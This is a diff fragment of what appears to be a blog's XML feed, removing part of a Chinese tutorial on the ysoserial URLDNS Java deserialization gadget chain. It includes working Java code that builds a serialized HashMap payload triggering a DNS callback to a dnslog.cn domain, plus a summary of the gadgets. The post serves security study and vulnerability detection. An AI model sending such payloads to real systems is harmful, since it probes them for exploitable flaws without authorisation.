-                &#125;
-
-                protected synchronized InetAddress getHostAddress(URL u) &#123;
-                        return null;
-                &#125;
-        &#125;
-&#125;
-</code></pre>
-<p> ysoserial的方法是：自定义了SilentURLStreamHandler扩展了 URLStreamHandler ，让<code>getHostAddress</code>和<code>openConnection</code>方法返回空，在初始化 URL 对象时传入，当调用HashMap的<code>put</code>方法触发hash值计算时，url对象对调用我们自定义的<code>getHostAddress</code>返回空，这样就不会触发 DNS 查询，然后在<code>put</code> 之后则是通过反射将 URL 对象的 hashCode 的值重新改为 -1。</p>
-<p>需要注意的是，为什么目标在反序列化时不会调用我们自定义的<code>getHostAddress</code>方法呢？</p>
-<p>在URL类中的<code>handler</code>属性前有个关键字<code>transient</code>,可以自定义在序列化时，把哪些属性不写入字节序列中。所以在反序列化时，目标还是会执行dns请求。</p>
-<pre><code>transient URLStreamHandler handler;
-</code></pre>
-<p>通过ysoserial的方法编写我们的测试demo：</p>
-<pre><code>public class URLDNS3 &#123;
-
-    static class SilentURLStreamHandler extends URLStreamHandler implements Serializable&#123;
-
-        protected URLConnection openConnection(URL u) throws IOException &#123;
-            return null;
-        &#125;
-
-        protected synchronized InetAddress getHostAddress(URL u) &#123;
-            return null;
-        &#125;
-    &#125;
-
-    public static void main(String[] args) throws Exception &#123;
-
-        URLStreamHandler      handler = new SilentURLStreamHandler();
-        HashMap&lt;URL, Integer&gt; hashMap = new HashMap&lt;&gt;();
-        URL                   url     = new URL(null, &quot;http://m7ful0.dnslog.cn&quot;, handler);
-        hashMap.put(url, 0);
-
-        Field f = Class.forName(&quot;java.net.URL&quot;).getDeclaredField(&quot;hashCode&quot;);
-        f.setAccessible(true);
-        f.set(url, -1);
-
-
-        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;E:\\JavaSecurity\\jndi_injection\\src\\main\\resources\\urldns3.bin&quot;));
-        oos.writeObject(hashMap);
-        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;E:\\JavaSecurity\\jndi_injection\\src\\main\\resources\\urldns3.bin&quot;));
-        ois.readObject();
-    &#125;
-&#125;
-</code></pre>
-<p>以上就是 URLDNS 分析的全部内容了，最后总结一下。</p>
-<ol>
-<li>利用说明：</li>
-</ol>
-<ul>
-<li>通过 HashMap 的反序列化调用 URL 的 hashCode 方法发起 DNS 查询，通常用来检测反序列化漏洞的存在。</li>
-</ul>
-<ol start="2">
-<li>Gadget 总结：</li>
-</ol>
-<ul>
-<li>kick-off gadget：java.util.HashMap#readObject()</li>
-<li>sink gadget：java.net.URL#hashCode()</li>
-<li>chain gadget：无</li>
-</ul>
-<ol start="3">
-<li>优点：</li>
-</ol>
-<ul>
-<li>使用java内部的类进行构造，不依赖第三方库</li>
-<li>如果目标可以出网，在目标没有回显的时候，可以用来验证是否存在反序列化漏洞</li>
-</ul>
-]]></content>
-      <categories>
-        <category>java安全</category>
-      </categories>
-      <tags>
-        <tag>java安全</tag>
-        <tag>反序列化</tag>
       </tags>
   </entry>
   <entry>
